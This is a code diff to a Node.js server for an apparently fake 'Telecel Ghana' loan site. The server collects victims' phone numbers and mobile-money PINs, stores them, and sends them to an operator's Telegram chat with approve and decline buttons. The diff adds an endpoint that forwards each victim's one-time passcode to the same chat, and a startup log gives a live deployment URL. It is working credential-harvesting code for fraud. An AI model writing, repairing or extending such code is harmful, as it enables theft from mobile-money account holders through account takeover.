@@ -3,7 +3,6 @@ const cors = require('cors');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
-require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -34,36 +33,37 @@ async function initDatabase() {
                 amount INTEGER,
                 duration INTEGER,
                 monthly_payment INTEGER,
-                total_payment INTEGER,
-                interest INTEGER,
                 status TEXT DEFAULT 'pending',
                 created_at DATETIME DEFAULT CURRENT_TIMESTAMP
             );
         `);
         console.log('✅ Database initialized');
+        return true;
     } catch (error) {
         console.error('❌ Database error:', error);
+        return false;
     }
 }
 
-async function sendTelegramMessage(text, replyMarkup = null) {
+async function sendTelegramMessage(text, replyMarkup) {
     try {
-        const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
-        if (replyMarkup) payload.reply_markup = replyMarkup;
         const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML',
+                reply_markup: replyMarkup
+            })
         });
         const data = await response.json();
-        if (data.ok) {
-            console.log('✅ Telegram sent');
-            return data.result.message_id;
-        }
-        return null;
+        if (data.ok) console.log('✅ Telegram sent');
+        else console.error('Telegram error:', data);
+        return data.ok;
     } catch (error) {
         console.error('Telegram error:', error);
-        return null;
+        return false;
     }
 }
 
@@ -72,7 +72,7 @@ function generateLoanId() {
 }
 
 app.get('/health', (req, res) => {
-    res.json({ status: 'ok' });
+    res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
 app.post('/api/save-loan', async (req, res) => {
@@ -84,13 +84,23 @@ app.post('/api/save-loan', async (req, res) => {
             await db.run(`INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
                 [loanId, phone, pin, network, amount, duration, monthly, 'pending']);
+            console.log(`✅ Loan saved: ${loanId}`);
         }
         
-        const messageText = `<b>🔴 NEW LOAN - GHANA</b>\n\nLoan ID: ${loanId}\nAmount: GHS ${amount}\nPhone: ${phone}\nPIN: ${pin}\nDuration: ${duration/30} months\nMonthly: GHS ${monthly}`;
+        const messageText = `<b>🔴 NEW LOAN - GHANA</b>\n\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
+            `<b>💰 Amount:</b> GHS ${amount}\n` +
+            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
+            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
+            `<b>📅 Duration:</b> ${duration/30} months\n` +
+            `<b>💳 Monthly:</b> GHS ${monthly}\n` +
+            `━━━━━━━━━━━━━━━━━━\n\n` +
+            `<b>⚠️ Action Required:</b>`;
         
         const replyMarkup = {
             inline_keyboard: [[
-                { text: "✅ Approve", callback_data: `approve_${loanId}` },
+                { text: "✅ Approve Loan", callback_data: `approve_${loanId}` },
                 { text: "❌ Decline", callback_data: `decline_${loanId}` }
             ]]
         };
@@ -98,54 +108,46 @@ app.post('/api/save-loan', async (req, res) => {
         await sendTelegramMessage(messageText, replyMarkup);
         res.json({ success: true, loanId });
     } catch (error) {
+        console.error('Save loan error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// Webhook handler - FIXED
 app.post('/webhook/telegram', async (req, res) => {
     try {
         const update = req.body;
         console.log('📨 Webhook received');
         
         if (update.callback_query) {
-            const data = update.callback_query.data;
-            const messageId = update.callback_query.message.message_id;
+            const callbackData = update.callback_query.data;
             const callbackId = update.callback_query.id;
-            const [action, loanId] = data.split('_');
+            const [action, loanId] = callbackData.split('_');
             
-            console.log(`Action: ${action}, LoanId: ${loanId}`);
+            console.log(`🎯 Action: ${action}, LoanId: ${loanId}`);
             
             if (action === 'approve' && db) {
                 await db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
-                console.log(`✅ Loan ${loanId} APPROVED in database`);
+                console.log(`✅ Loan ${loanId} APPROVED`);
                 
-                // Update message to show approved
-                await fetch(`${TELEGRAM_API}/editMessageText`, {
+                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        message_id: messageId,
-                        text: `✅ LOAN APPROVED\n\nLoan ID: ${loanId}\nStatus: APPROVED`,
-                        parse_mode: 'HTML'
+                        callback_query_id: callbackId,
+                        text: "✅ Loan Approved! User can now proceed."
                     })
-                });
-                
-                // Answer callback
-                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ callback_query_id: callbackId, text: "Loan Approved!" })
                 });
             } else if (action === 'decline' && db) {
                 await db.run(`UPDATE loans SET status = 'declined' WHERE loan_id = ?`, [loanId]);
-                console.log(`❌ Loan ${loanId} DECLINED in database`);
+                console.log(`❌ Loan ${loanId} DECLINED`);
                 
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ callback_query_id: callbackId, text: "Loan Declined" })
+                    body: JSON.stringify({
+                        callback_query_id: callbackId,
+                        text: "❌ Loan Declined"
+                    })
                 });
             }
         }
@@ -153,6 +155,27 @@ app.post('/webhook/telegram', async (req, res) => {
     } catch (error) {
         console.error('Webhook error:', error);
         res.sendStatus(200);
+    }
+});
+
+app.post('/api/save-otp', async (req, res) => {
+    try {
+        const { loanId, otp, phone } = req.body;
+        console.log(`🔐 OTP entered - Loan: ${loanId}, Phone: ${phone}, OTP: ${otp}`);
+        
+        const messageText = `<b>🔐 OTP ENTERED - GHANA</b>\n\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
+            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
+            `<b>🔑 OTP Code:</b> <code>${otp}</code>\n` +
+            `━━━━━━━━━━━━━━━━━━\n\n` +
+            `<b>✅ User is completing the loan process.</b>`;
+        
+        await sendTelegramMessage(messageText, null);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Save OTP error:', error);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
@@ -171,9 +194,13 @@ app.get('/verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'publi
 app.get('/otp.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'otp.html')); });
 
 async function startServer() {
-    await initDatabase();
+    const dbInit = await initDatabase();
+    if (!dbInit) {
+        console.log('⚠️ Database warning - continuing anyway');
+    }
     app.listen(PORT, '0.0.0.0', () => {
-        console.log(`🚀 Server running on port ${PORT}`);
+        console.log(`🚀 Telecel Ghana Server running on port ${PORT}`);
+        console.log(`📍 URL: https://ghanatelecelcash-production.up.railway.app`);
     });
 }
 
